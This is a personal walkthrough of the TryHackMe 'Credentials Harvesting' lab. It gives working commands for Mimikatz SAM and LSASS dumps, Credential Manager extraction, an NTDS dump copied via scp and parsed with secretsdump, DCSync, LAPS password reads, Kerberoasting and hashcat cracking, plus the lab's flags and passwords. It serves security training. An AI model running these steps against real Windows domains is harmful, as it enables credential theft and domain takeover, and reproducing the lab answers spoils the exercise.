![[Pasted image 20250607214613.png]]

Room Link : https://tryhackme.com/room/credharvesting
Difficulty : Medium

---

##### Credentials Harvesting

Credentials Harvesting is a term for gaining access to user and system credentials. It is a technique to look for or steal stored credentials, including network sniffing, where an attacker captures transmitted credentials. 

Credentials can be found in a variety of different forms, such as:

- Accounts details (usernames and passwords)
- Hashes that include NTLM hashes, etc.
- Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)  
- Any information that helps login into a system (private keys, etc.)

Generally speaking, there are two types of credential harvesting: external and internal. External credential harvesting most likely involves phishing emails and other techniques to trick a user into entering his username and password. If you want to learn more about phishing emails, we suggest trying the THM [Phishing](https://tryhackme.com/room/phishingyl) room. Obtaining credentials through the internal network uses different approaches.

In this room, the focus will be on harvesting credentials from an internal perspective where a threat actor has already compromised a system and gained initial access. 

We have provided a Windows Server 2019 configured as a Domain Controller. To follow the content discussed in this room, deploy the machine and move on to the next task.

You can access the machine in-browser or through RDP using the credentials below.

Machine IP: 10.10.103.126            Username: thm         Password: Passw0rd! 

Ensure to deploy the AttackBox as it is required in attacks discussed in this room.

--- 

##### Credential Access  

*  Using the "reg query" command, search for the value of the "flag" keyword in the Windows registry?

Command :

```
reg query HKLM /f flag /t REG_SZ /s 
```


![[Screenshot From 2025-06-07 22-02-53.png]]

```
Flag : 7tyh4ckm3
```

* Enumerate the AD environment we provided. What is the password of the victim user found in the description section?

Open Powershell 
Command :

```
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```

![[Pasted image 20250607221209.png]]

```
Flag :  Passw0rd!@# 
```

---

##### Local Windows Credentials

* Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?

We can use Mimikatz tool for this part, Which is already available inside C:\Tools

Command :

```
privilege::debug
token::elevate
lsadump::sam
```

This command will dump the credentials

![[Pasted image 20250607222258.png]]

```
Flag : 98d3a787a80d08385cea7fb4aa2a4261
```

---

##### Local Security Authority Subsystem Service (LSASS).

* Is the LSA protection enabled? (Y|N)

```
Y
```

* If yes, try removing the protection and dumping the memory using Mimikatz. Once you have done, hit Complete.



---

##### Windows Credential Manager

* Apply the technique for extracting clear-text passwords from Windows Credential Manager. What is the password of the THMuser for internal-app.thm.red?

Command :

```
C:\Users\Administrator>powershell -ex bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Import-Module C:\Tools\Get-WebCredentials.ps1
PS C:\Users\Administrator> Get-WebCredentials
```

![[Pasted image 20250607223402.png]]

```
Flag : E4syPassw0rd
```

* Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password?

Command : 

```
privilege::debug
sekurlsa::credman
```


![[Pasted image 20250607224102.png]]

```
Flag : jfxKruLkkxoPjwe3
```

* Run cmd.exe under thm-local user via runas and read the flag in "c:\Users\thm-local\Saved Games\flag.txt". What is the flag?

We need to run below command to spawn a command prompt inside user `thm-local` user 

```
runas /savecred /user:thm.red\thm-local cmd.exe  
```

Flag is located in C:\User\thm-local\Saved Games\flag.txt 

![[Pasted image 20250607224725.png]]

```
Flag : THM{RunA5S4veCr3ds}
```

---

##### Domain Controller

This was another great part of this module. I have used Mimikatz DCSync and Impacket’s secretsdump in the past to dump hashes from AD, however I had not dumped it offline before. Attackers may use this technique if they manage to access a DC in order to avoid tripping network traffic monitors. They also may use it if they can access an offline backup.

* Apply the technique discussed in this task to dump the NTDS file **locally** and extract hashes. What is the target system bootkey value? **Note**: Use thm.red/thm as an Active Directory user since it has administrator privileges!

Command :

```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

![[Pasted image 20250607232333.png]]

Now, if we check the `c:\temp` directory, we see two folders: Active Directory and registry, which contain the three files we need. Transfer them to the Local box and run the secretsdump.py script to extract the hashes from the dumped memory file.

![[Pasted image 20250608000635.png]]

Using scp for copying and sending files to attack machine

```
scp .\Active Directory root@10.10.123.233:/root/. 
```

Now we need to perform attack using `secretsdump.py`

```
python3.9 /opt/impacket/examples/secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit local
```

![[Pasted image 20250609193907.png]]

We got the dump.

From the registry details we will get the bootkey which is the first flag 

```
Flag : 0x36c8d26ec0df8b23ce63bcefa6e2d821
```

DC Sync

The DC Sync is a popular attack to perform within an Active Directory environment to dump credentials remotely. This attack works when an account (special account with necessary permissions) or AD admin account is compromised that has the following AD permissions:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set  

An adversary takes advantage of these configurations to perform domain replication, commonly referred to as "DC Sync", or Domain Controller Sync

Command

```
python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/thm@10.10.30.8
```

* What is the clear-text password for the **bk-admin** username?

From the Above command we will get the hash of all the users in that domain controller

Let's crack bk-admin hash value

```
bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49:
```

Hash :
```
077cccc23f8ab7031726a3b70c694a49
```

Use hashcat or John for this process 

```
user@machine$ hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/rockyou.txt
```

Output 

```
Flag : Passw0rd123
```


---
##### Local Administrator Password Solution (LAPS)

* Which group has ExtendedRightHolder and is able to read the LAPS password?

```
Import-Module ActiveDirectory  
(Get-ADComputer $env:COMPUTERNAME -Properties *).DistinguishedName  
Find-AdmPwdExtendedRights -Identity "OU=THMorg,DC=thm,DC=red"
```

Output:

```
Flag : LAPsReader 
```

* Follow the technique discussed in this task to get the LAPS password. What is the LAPs Password for **Creds-Harvestin** computer?

```
Get-AdmPwdPassword CREDS-HARVESTIN
```

Output :

```
THMLAPSPassw0rd 
```

* Which user is able to read LAPS passwords?

```
Get-ADGroupMember -Identity “LAPsReader”
```

Output :
```
bk-admin
```


--- 

#### Other Attacks

* Enumerate for SPN users using the Impacket GetUserSPNs script. What is the Service Principal Name for the Domain Controller?


```
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.30.8 THM.red/thm
```

Flag 

```
svc-thm
```

* After finding the SPN account from the previous question, perform the Kerberoasting attack to grab the TGS ticket and crack it. What is the password?

We got Ticket from the previous step so we need to crack that using hashcat or john -

```
hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

Flag :

```
Passw0rd1
```

---

#### Conclusion

In this room, we discussed the various approaches to obtaining users' credentials, including the local computer and Domain Controller, which conclude the following:

- We discussed accessing Windows memory, dumping an LSASS process, and extracting authentication hashes.
- We discussed Windows Credentials Manager and methods to extract passwords. 
- We introduced the Windows LAPS feature and enumerated it to find the correct user and target to extract passwords.
- We introduced AD attacks which led to dumping and extracting users' credentials.

The following tools may be worth trying to scan a target machine (files, memory, etc.) for hunting sensitive information. We suggest trying them out in the enumeration stage.

- [Snaffler](https://github.com/SnaffCon/Snaffler)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [Lazagne](https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/)


The END]